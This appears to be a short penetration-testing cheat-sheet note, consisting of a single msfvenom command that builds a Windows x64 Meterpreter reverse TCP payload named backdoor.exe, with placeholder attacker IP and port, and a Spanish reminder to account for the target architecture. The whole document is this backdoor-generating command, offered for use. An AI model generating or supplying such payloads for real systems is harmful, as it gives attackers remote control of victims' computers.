
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe >backdoor.exe

NOTA: tener en cuenta la arquitectura